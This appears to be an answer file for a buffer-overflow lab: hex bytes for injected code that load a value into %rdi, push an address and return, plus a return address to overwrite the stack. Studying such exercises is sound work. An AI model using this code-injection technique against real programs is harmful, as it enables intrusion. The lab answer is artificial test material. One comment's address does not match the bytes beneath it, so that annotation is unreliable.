68 ec 17 40 00       	/* pushq  $0x4017ec8 */
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
c3                   	/* retq   */

/* reverse the inject sequence to match the stack writing order 8/

00 00 00 00 55 61 dc 98    /* return address */

68 ec 17 40 00       	/* pushq  $0x4017ec8 */
48 c7 c7 fa 97 b9 59 /*	mov    $0x59b997fa,%rdi */
c3                   /*	retq    */
*/
